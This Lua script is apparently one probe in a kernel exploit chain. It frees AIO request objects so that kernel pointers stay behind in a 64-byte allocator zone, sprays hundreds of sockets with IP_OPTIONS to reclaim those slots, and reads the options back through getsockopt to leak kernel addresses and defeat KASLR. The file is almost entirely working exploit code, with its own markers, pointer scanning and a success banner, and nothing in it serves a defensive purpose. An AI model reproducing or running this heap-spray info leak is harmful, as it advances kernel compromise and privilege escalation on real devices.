-- CRASH_CLASS: LOW
-- PROBE 73a: IP_OPTIONS spray for R-object KASLR readback
--
-- Strategy: free AIO R-object (48B in 64B UMA zone) → spray IP_OPTIONS
-- via setsockopt → readback via getsockopt → check for kernel pointers.
--
-- R+0x00 = curthread+0x390, R+0x08 = curthread+0x08 (13.60 verified).
-- These kernel pointers survive in the freed zone slot (NOT zeroed).
--
-- IP_OPTIONS (setsockopt level=0, optname=1) stores caller data in the
-- ip_options mbuf attached to the socket's inp. The mbuf payload is
-- typically 40-44 bytes, which may land in the same 64B UMA zone as R.
-- getsockopt(IP_OPTIONS) reads it back → potential KASLR leak.
--
-- NEVER call 670 (aio_init).

print("=== PROBE 73a: IP_OPTIONS SPRAY FOR R-OBJECT KASLR ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local pid = N(mk(20)())
print("pid=" .. pid)

local sc_socket    = mk(97)   -- socket(domain, type, proto)
local sc_close     = mk(6)
local sc_setsockopt = mk(105) -- setsockopt(fd, level, name, val, len)
local sc_getsockopt = mk(118) -- getsockopt(fd, level, name, val, lenp)
local sc_669       = mk(669)
local sc_664       = mk(664)
local sc_662       = mk(662)

local IP_OPTIONS = 1
local IPPROTO_IP = 0
local SOL_SOCKET = 0xFFFF

-- ============================================================
-- [A] Test IP_OPTIONS set/get on a single socket
-- ============================================================
print("[A] IP_OPTIONS basic test")

local test_fd = N(sc_socket(uint64(2), uint64(1), uint64(0)))  -- AF_INET, SOCK_STREAM
print("  test socket fd=" .. test_fd)

if test_fd < 0 then
    print("  FAIL: socket creation failed")
    return
end

-- Try setting IP_OPTIONS with various sizes
local opt_sizes = {4, 8, 16, 20, 40, 44}
for _, sz in ipairs(opt_sizes) do
    local opt_buf = memory.alloc(sz)
    -- Fill with marker pattern
    for i = 0, sz - 1, 4 do
        wd(N(opt_buf) + i, 0xAA000000 + i)
    end

    local ok, ret = pcall(function()
        return sc_setsockopt(uint64(test_fd), uint64(IPPROTO_IP), uint64(IP_OPTIONS),
            uint64(N(opt_buf)), uint64(sz))
    end)
    local rv = ok and N(ret) or -999

    -- Read back
    local get_buf = memory.alloc(64)
    for i = 0, 60, 4 do wd(N(get_buf) + i, 0xBB000000 + i) end
    local lenp = memory.alloc(8)
    wd(N(lenp), 64)

    local ok2, ret2 = pcall(function()
        return sc_getsockopt(uint64(test_fd), uint64(IPPROTO_IP), uint64(IP_OPTIONS),
            uint64(N(get_buf)), uint64(N(lenp)))
    end)
    local rv2 = ok2 and N(ret2) or -999
    local got_len = rd(N(lenp)) or 0

    print(string.format("  set sz=%d ret=%d | get ret=%d len=%d", sz, rv, rv2, got_len))

    -- Show readback bytes
    if rv2 == 0 and got_len > 0 then
        local hex = "  data:"
        for i = 0, math.min(got_len - 1, 47), 4 do
            hex = hex .. string.format(" %08X", rd(N(get_buf) + i) or 0)
        end
        print(hex)
    end
end

pcall(function() sc_close(uint64(test_fd)) end)
print("")

-- ============================================================
-- [B] AIO submit + delete to free R with kernel pointers
-- ============================================================
print("[B] Free AIO R-objects (kernel pointers survive in zone)")

-- Open /dev/zero for AIO reads
local fd_zero = N(mk(5)(
    (function()
        local p = memory.alloc(16)
        for i = 0, 15 do pcall(function() memory.write_byte(N(p) + i, string.byte("/dev/zero\0", i + 1) or 0) end) end
        return uint64(N(p))
    end)(),
    uint64(0), uint64(0)))
print("  fd_zero=" .. fd_zero)

if fd_zero < 0 then
    print("  FAIL: /dev/zero open failed")
    return
end

local data_buf = memory.alloc(0x100)
local result_buf = memory.alloc(0x100)
local NUM_AIO = 64  -- Free 64 R-objects to increase reclaim probability

local freed_count = 0

for batch = 1, NUM_AIO do
    -- Submit
    local req = memory.alloc(0x28)
    wd(N(req), 1)              -- cmd = read
    wd(N(req) + 0x04, fd_zero) -- fd
    wq(N(req) + 0x08, uint64(N(data_buf)))
    wq(N(req) + 0x10, uint64(16))
    wq(N(req) + 0x18, uint64(0))

    local id_buf = memory.alloc(8)
    wd(N(id_buf), 0)

    local ok1, r1 = pcall(function()
        return sc_669(uint64(1), uint64(N(req)), uint64(1), uint64(1), uint64(N(id_buf)))
    end)
    local aio_id = rd(N(id_buf)) or 0
    if aio_id == 0 then break end

    -- Poll
    local poll_st = memory.alloc(8)
    wd(N(poll_st), 0)
    pcall(function() sc_664(uint64(N(id_buf)), uint64(1), uint64(N(poll_st))) end)

    -- Delete (frees R with kernel pointers at +0x00/+0x08)
    local del_st = memory.alloc(8)
    wd(N(del_st), 0)
    pcall(function() sc_662(uint64(N(id_buf)), uint64(1), uint64(N(del_st))) end)

    local ds = rd(N(del_st)) or -1
    if ds == 0 then freed_count = freed_count + 1 end
end

print(string.format("  freed %d R-objects", freed_count))
pcall(function() sc_close(uint64(fd_zero)) end)
print("")

-- ============================================================
-- [C] Spray IP_OPTIONS to reclaim R's zone slots
-- ============================================================
print("[C] IP_OPTIONS spray: create sockets + set options")

local SPRAY_COUNT = 256
local spray_fds = {}
local opt_data = memory.alloc(44)
-- Fill with known pattern to distinguish from kernel pointers
for i = 0, 40, 4 do wd(N(opt_data) + i, 0xCC000000 + i) end

local set_ok = 0
local set_fail = 0

for i = 1, SPRAY_COUNT do
    local fd = N(sc_socket(uint64(2), uint64(2), uint64(0)))  -- AF_INET, SOCK_DGRAM (UDP)
    if fd >= 0 then
        spray_fds[#spray_fds + 1] = fd

        -- Set IP_OPTIONS with 40 bytes (max IP options length)
        local ok, ret = pcall(function()
            return sc_setsockopt(uint64(fd), uint64(IPPROTO_IP), uint64(IP_OPTIONS),
                uint64(N(opt_data)), uint64(40))
        end)
        if ok and N(ret) == 0 then
            set_ok = set_ok + 1
        else
            set_fail = set_fail + 1
        end
    end
end

print(string.format("  created %d sockets, set_ok=%d set_fail=%d", #spray_fds, set_ok, set_fail))
print("")

-- ============================================================
-- [D] Readback: getsockopt(IP_OPTIONS) looking for kernel pointers
-- ============================================================
print("[D] Readback scan for kernel pointers")

local kptr_count = 0
local total_with_data = 0

for idx, fd in ipairs(spray_fds) do
    local get_buf = memory.alloc(64)
    for i = 0, 60, 4 do wd(N(get_buf) + i, 0xEE000000 + i) end
    local lenp = memory.alloc(8)
    wd(N(lenp), 64)

    local ok, ret = pcall(function()
        return sc_getsockopt(uint64(fd), uint64(IPPROTO_IP), uint64(IP_OPTIONS),
            uint64(N(get_buf)), uint64(N(lenp)))
    end)

    if ok and N(ret) == 0 then
        local got_len = rd(N(lenp)) or 0
        if got_len > 0 then
            total_with_data = total_with_data + 1

            -- Scan all qwords for kernel pointers
            for off = 0, got_len - 8, 8 do
                local qval = rq(N(get_buf) + off)
                if qval then
                    local qh, ql = get_hi_lo(qval)
                    -- Skip our marker pattern (0xCC000000+)
                    local dw = rd(N(get_buf) + off) or 0
                    local is_our_marker = (math.floor(dw / 0x1000000) == 0xCC)

                    if qh >= 0xFFFF8000 and qh ~= 0xFFFFFFFF and not is_our_marker then
                        kptr_count = kptr_count + 1
                        print(string.format("  *** KPTR *** fd=%d off=+0x%02X val=%s (socket #%d)",
                            fd, off, fmt(qval), idx))
                    end
                end
            end

            -- Check if data differs from our marker (reclaimed zone memory)
            local first_dw = rd(N(get_buf)) or 0
            if first_dw ~= 0xCC000000 and idx <= 10 then
                local hex = ""
                for i = 0, math.min(got_len - 1, 31), 4 do
                    hex = hex .. string.format(" %08X", rd(N(get_buf) + i) or 0)
                end
                print(string.format("  fd=%d len=%d UNEXPECTED:%s", fd, got_len, hex))
            end
        end
    end
end

print(string.format("  sockets with data: %d/%d", total_with_data, #spray_fds))
print(string.format("  kernel pointers:   %d", kptr_count))
print("")

-- ============================================================
-- [E] Try different option sizes to match 64B zone
-- ============================================================
print("[E] Size sweep: set options of different sizes to match R zone")

local sizes_to_try = {8, 16, 20, 24, 32, 36, 40, 44, 48}
for _, sz in ipairs(sizes_to_try) do
    local fd = N(sc_socket(uint64(2), uint64(2), uint64(0)))
    if fd < 0 then break end

    local buf = memory.alloc(sz)
    for i = 0, sz - 1, 4 do wd(N(buf) + i, 0xDD000000 + sz * 256 + i) end

    local ok, ret = pcall(function()
        return sc_setsockopt(uint64(fd), uint64(IPPROTO_IP), uint64(IP_OPTIONS),
            uint64(N(buf)), uint64(sz))
    end)

    local get_buf = memory.alloc(64)
    for i = 0, 60, 4 do wd(N(get_buf) + i, 0) end
    local lenp = memory.alloc(8)
    wd(N(lenp), 64)

    local ok2, ret2 = pcall(function()
        return sc_getsockopt(uint64(fd), uint64(IPPROTO_IP), uint64(IP_OPTIONS),
            uint64(N(get_buf)), uint64(N(lenp)))
    end)
    local rv2 = ok2 and N(ret2) or -999
    local got_len = rd(N(lenp)) or 0

    print(string.format("  sz=%d set=%d get=%d got_len=%d", sz,
        ok and N(ret) or -999, rv2, got_len))

    pcall(function() sc_close(uint64(fd)) end)
end
print("")

-- ============================================================
-- [F] Cleanup
-- ============================================================
print("[F] Cleanup: closing spray sockets")
for _, fd in ipairs(spray_fds) do
    pcall(function() sc_close(uint64(fd)) end)
end

print("")
print("[G] SUMMARY")
print(string.format("  AIO R-objects freed: %d", freed_count))
print(string.format("  spray sockets:       %d", #spray_fds))
print(string.format("  kernel pointers:     %d", kptr_count))

if kptr_count > 0 then
    print("*** KASLR DEFEAT VIA IP_OPTIONS SPRAY ***")
else
    print("No kernel pointers — IP_OPTIONS may not land in R's 64B zone")
end

print("")
print("alive=YES")
print("=== PROBE 73a COMPLETE ===")
